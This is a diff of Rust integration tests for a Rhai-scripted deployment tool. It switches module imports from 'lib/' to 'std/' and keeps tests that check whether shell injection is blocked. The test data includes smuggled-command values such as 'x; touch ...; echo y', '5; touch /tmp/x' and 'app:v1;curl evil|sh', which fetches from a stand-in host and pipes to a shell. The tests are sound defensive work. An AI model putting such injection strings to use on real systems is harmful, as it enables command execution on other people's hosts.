@@ -15,12 +15,6 @@ use assert_cmd::Command;
 use std::fs;
 use std::path::Path;
 
-fn link_lib(dir: &Path) {
-    let repo_lib = Path::new(env!("CARGO_MANIFEST_DIR")).join("lib");
-    #[cfg(unix)]
-    std::os::unix::fs::symlink(&repo_lib, dir.join("lib")).unwrap();
-}
-
 /// Escape `s` so it can be embedded as the content of a Rhai double-quoted string literal.
 fn rhai_string_literal(s: &str) -> String {
     s.replace('\\', "\\\\").replace('"', "\\\"")
@@ -28,7 +22,6 @@ fn rhai_string_literal(s: &str) -> String {
 
 fn run_live(dir: &Path, script: &str) {
     fs::create_dir_all(dir.join(".energize")).unwrap();
-    link_lib(dir);
     fs::write(dir.join("Energize.rhai"), script).unwrap();
     // Exit code is irrelevant here (aws/docker are almost certainly not installed in the test
     // environment, so the real login/exec calls fail with "command not found" — that's fine,
@@ -53,7 +46,7 @@ fn ecr_login_region_cannot_inject_shell_commands() {
     let region = format!("x\"; touch {}; echo \"", marker.display());
     let script = format!(
         r#"
-        import "lib/registry" as registry;
+        import "std/registry" as registry;
         registry::ecr_login("local", #{{ region: "{region}" }});
         "#,
         region = rhai_string_literal(&region),
@@ -74,7 +67,7 @@ fn runtime_exec_cmd_container_name_cannot_inject_shell_commands() {
     let name = format!("x; touch {}; echo y", marker.display());
     let script = format!(
         r#"
-        import "lib/runtime" as rt;
+        import "std/runtime" as rt;
         let cmd = rt::runtime_exec_cmd("{name}", "echo hi");
         local_exec(cmd);
         "#,
@@ -91,7 +84,6 @@ fn runtime_exec_cmd_container_name_cannot_inject_shell_commands() {
 fn run_dry(script: &str) -> (bool, String, String) {
     let dir = tempfile::tempdir().unwrap();
     fs::create_dir_all(dir.path().join(".energize")).unwrap();
-    link_lib(dir.path());
     fs::write(dir.path().join("Energize.rhai"), script).unwrap();
     let out = Command::cargo_bin("nrg")
         .unwrap()
@@ -120,7 +112,7 @@ fn health_timeout_must_be_an_integer() {
             r#"hc::wait_healthy("http://localhost:1/up", #{ timeout: "5; touch /tmp/x" });"#,
         ),
     ] {
-        let (ok, out, err) = run_dry(&format!("import \"lib/healthcheck\" as hc;\n{call}"));
+        let (ok, out, err) = run_dry(&format!("import \"std/healthcheck\" as hc;\n{call}"));
         assert!(!ok, "{func} accepted a string timeout");
         assert!(
             err.contains("cfg.timeout must be a positive number"),
@@ -143,12 +135,12 @@ fn health_timeout_float_is_accepted_when_positive_and_finite() {
         r#"hc::wait_healthy_on_host("web1", 8080, #{ timeout: 2.5 });"#,
         r#"hc::wait_healthy("http://localhost:1/up", #{ timeout: 2.5 });"#,
     ] {
-        let (ok, _, err) = run_dry(&format!("import \"lib/healthcheck\" as hc;\n{call}"));
+        let (ok, _, err) = run_dry(&format!("import \"std/healthcheck\" as hc;\n{call}"));
         assert!(ok, "float timeout rejected: {err}");
     }
     for bad in ["0.0", "-1.5", "0.0 / 0.0", "1.0 / 0.0"] {
         let (ok, out, err) = run_dry(&format!(
-            "import \"lib/healthcheck\" as hc;\nhc::wait_healthy_on_host(\"web1\", 8080, #{{ timeout: {bad} }});"
+            "import \"std/healthcheck\" as hc;\nhc::wait_healthy_on_host(\"web1\", 8080, #{{ timeout: {bad} }});"
         ));
         assert!(!ok, "timeout {bad} accepted: {out}");
         assert!(err.contains("cfg.timeout must be"), "{bad}: {err}");
@@ -159,7 +151,7 @@ fn health_timeout_float_is_accepted_when_positive_and_finite() {
 #[test]
 fn health_timeout_integer_is_still_accepted() {
     let (ok, _, err) = run_dry(
-        r#"import "lib/healthcheck" as hc;
+        r#"import "std/healthcheck" as hc;
         hc::wait_healthy_on_host("web1", 8080, #{ timeout: 5 });"#,
     );
     assert!(ok, "integer timeout rejected: {err}");
@@ -171,7 +163,7 @@ fn health_timeout_integer_is_still_accepted() {
 fn caddy_maintenance_status_code_is_validated() {
     for bad in [r#""503,\"evil\":1""#, "99", "600", "5.5"] {
         let (ok, _, err) = run_dry(&format!(
-            "import \"lib/caddy\" as caddy;\ncaddy::proxy_maintenance(\"web1\", \"app\", true, #{{ status_code: {bad} }});"
+            "import \"std/caddy\" as caddy;\ncaddy::proxy_maintenance(\"web1\", \"app\", true, #{{ status_code: {bad} }});"
         ));
         assert!(!ok, "status_code {bad} accepted");
         assert!(
@@ -180,7 +172,7 @@ fn caddy_maintenance_status_code_is_validated() {
         );
     }
     let (ok, _, err) = run_dry(
-        r#"import "lib/caddy" as caddy;
+        r#"import "std/caddy" as caddy;
         caddy::proxy_maintenance("web1", "app", true, #{ status_code: 502 });"#,
     );
     assert!(ok, "valid status_code rejected: {err}");
@@ -191,8 +183,8 @@ fn caddy_maintenance_status_code_is_validated() {
 #[test]
 fn docker_run_and_proxy_deploy_quote_metacharacters_in_the_plan() {
     let (ok, out, err) = run_dry(
-        r#"import "lib/docker" as docker;
-        import "lib/caddy" as caddy;
+        r#"import "std/docker" as docker;
+        import "std/caddy" as caddy;
         docker::docker_run("web1", "app:v1;curl evil|sh", "n$(id)", #{});
         caddy::proxy_deploy("web1", "svc'x;id", "10.0.0.1:3000", #{ domain: "a.example.com" });"#,
     );
